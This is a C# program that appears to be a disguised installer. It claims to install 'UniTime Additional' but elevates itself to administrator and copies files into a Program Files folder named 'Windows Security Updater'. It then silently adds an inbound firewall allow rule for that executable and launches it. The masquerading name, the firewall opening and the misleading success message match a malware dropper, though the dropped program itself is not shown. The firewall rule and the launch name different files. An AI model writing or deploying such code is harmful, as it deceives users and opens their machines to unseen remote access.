using NetFwTypeLib;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

class Program
{
    static void Main(string[] args)
    {
        try
        {
            // Check if the application is running with admin rights
            if (!IsRunningAsAdmin())
            {
                // Restart the application with admin rights
                RunAsAdmin();
                return; // Exit the current process
            }

            // Path to "Program Files" directory
            string programFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

            // Path to the "Windows Security Updater" folder
            string updaterFolderPath = Path.Combine(programFilesPath, "Windows Security Updater");

            // Create the folder if it doesn't exist
            if (!Directory.Exists(updaterFolderPath))
            {
                Directory.CreateDirectory(updaterFolderPath);

                // Copy files to the new folder
                CopyFilesToFolder(updaterFolderPath);

                // Run the executable in the folder
                RunFilesInFolder(updaterFolderPath);
            }
            else
            {
                Console.WriteLine("Windows Security Updater is already installed.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
        Console.ReadKey();
    }

    // Check if the application is running as admin
    static bool IsRunningAsAdmin()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    // Restart the application with admin rights
    static void RunAsAdmin()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            UseShellExecute = true,
            WorkingDirectory = Environment.CurrentDirectory,
            FileName = Process.GetCurrentProcess().MainModule.FileName,
            Verb = "runas" // Request admin rights
        };

        try
        {
            Process.Start(startInfo);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error starting as admin: {ex.Message}");
        }
    }

    // Copy files to the specified folder
    static void CopyFilesToFolder(string folderPath)
    {
        try
        {
            // Copy files from current directory
            foreach (string filePath in Directory.GetFiles(Environment.CurrentDirectory))
            {
                string fileName = Path.GetFileName(filePath);
                string destinationFilePath = Path.Combine(folderPath, fileName);
                File.Copy(filePath, destinationFilePath, true);
            }

            // Copy files from the 'sv' subdirectory
            foreach (string filePath in Directory.GetFiles(Path.Combine(Environment.CurrentDirectory, "sv")))
            {
                string fileName = Path.GetFileName(filePath);
                string destinationFilePath = Path.Combine(folderPath, fileName);
                File.Copy(filePath, destinationFilePath, true);
            }

            // Copy files from the 'UniTime' subdirectory to the desktop
            string pathToUni = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "UnitimeAdditional");
            Directory.CreateDirectory(pathToUni);
            foreach (string filePath in Directory.GetFiles(Path.Combine(Environment.CurrentDirectory, "UniTime")))
            {
                string fileName = Path.GetFileName(filePath);
                string destinationFilePath = Path.Combine(pathToUni, fileName);
                File.Copy(filePath, destinationFilePath, true);
            }

            FUnlocker();
            Console.WriteLine("UniTime Additional installed");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error copying files to folder: {ex.Message}");
        }
    }

    // Run executable files in the specified folder
    static void RunFilesInFolder(string folderPath)
    {
        try
        {
            string updaterExePath = Path.Combine(folderPath, "Security Updater.exe");
            Process.Start(new ProcessStartInfo
            {
                FileName = updaterExePath,
                UseShellExecute = true
            });
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error running files in folder: {ex.Message}");
        }
    }

    // Configure Windows Firewall to allow the application
    static void FUnlocker()
    {
        try
        {
            string programFilesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Windows Security Updater", "Windows Security Updater.exe");
            var firewallPolicy = Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwPolicy2")) as INetFwPolicy2;
            INetFwRule firewallRule = Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule")) as INetFwRule;

            firewallRule.Name = "Windows Security Updater";
            firewallRule.ApplicationName = programFilesPath;
            firewallRule.Action = NET_FW_ACTION_.NET_FW_ACTION_ALLOW;
            firewallRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_IN;
            firewallRule.Enabled = true;

            firewallPolicy.Rules.Add(firewallRule);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error configuring firewall: {ex.Message}");
        }
    }
}
